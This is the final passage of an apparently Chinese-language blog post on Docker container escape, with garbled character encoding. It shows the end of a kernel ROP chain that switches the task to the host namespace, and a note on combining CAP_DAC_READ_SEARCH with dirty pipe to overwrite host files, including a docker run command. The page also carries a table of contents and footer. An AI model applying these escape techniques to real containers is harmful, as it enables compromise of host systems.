MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ = kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ = kbase_addr + INIT_NSPROXY; <span class="comment">// RSI</span></span><br><span class="line">  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;</span><br></pre></td></tr></table></figure>

<h4 id="dirty-pipe"><a href="#dirty-pipe" class="headerlink" title="dirty pipe"></a>dirty pipe</h4><p>é€šè¿‡åˆ©ç”¨Â <code>CAP_DAC_READ_SEARCH</code>Â ä¸è„ç®¡é“å¯ä»¥å®ç°è¦†ç›–ä¸»æœºæ–‡ä»¶ï¼Œå®é™…ä¸Šä¸»è¦æ˜¯<code>CAP_DAC_READ_SEARCH</code>å¯ä»¥è°ƒç”¨<code>open_by_handle_at</code>, å¯ä»¥è·å¾—ä¸»æœºæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé…åˆè„ç®¡é“äºæ˜¯å°±å¯ä»¥ä¿®æ”¹ä¸»æœºæ–‡ä»¶ã€‚ä½†æ˜¯éœ€è¦æ·»åŠ capæƒé™ <a target="_blank" rel="noopener" href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=CAP_DAC_READ_SEARCH ubuntu</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/">äº‘åŸç”Ÿ | T Wiki (teamssix.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">Dockeræ ¸å¿ƒåŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#namespace"><span class="toc-number">1.1.</span> <span class="toc-text">namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgroup"><span class="toc-number">1.2.</span> <span class="toc-text">cgroup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Union-FS"><span class="toc-number">1.3.</span> <span class="toc-text">Union FS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MORE"><span class="toc-number">1.4.</span> <span class="toc-text">MORE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">Dockeré€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8BDocker%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">æ£€æµ‹Dockerç¯å¢ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE"><span class="toc-number">2.2.</span> <span class="toc-text">Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text">Dockerå±é™©æŒ‚è½½</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#docker-sock"><span class="toc-number">2.3.1.</span> <span class="toc-text">docker.sock</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">æ ¹ç›®å½•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#procfs"><span class="toc-number">2.3.3.</span> <span class="toc-text">procfs</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-remote-API"><span class="toc-number">2.4.</span> <span class="toc-text">Docker remote API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4Docker-%E9%80%83%E9%80%B8"><span class="toc-number">2.5.</span> <span class="toc-text">ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#runc"><span class="toc-number">2.5.1.</span> <span class="toc-text">runc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#containerd"><span class="toc-number">2.5.2.</span> <span class="toc-text">containerd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text">å†…æ ¸æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP"><span class="toc-number">2.6.1.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dirty-pipe"><span class="toc-number">2.6.2.</span> <span class="toc-text">dirty pipe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/06/Docker-escape/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&text=Docker-escape"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&is_video=false&description=Docker-escape"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Docker-escape&body=Check out this article: https://ha0-y.github.io/2024/03/06/Docker-escape/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&name=Docker-escape&description=&lt;blockquote&gt;
&lt;p&gt;äº‘ğŸ˜¶â€ğŸŒ«ï¸&lt;/p&gt;
&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/06/Docker-escape/&t=Docker-escape"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    chips
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
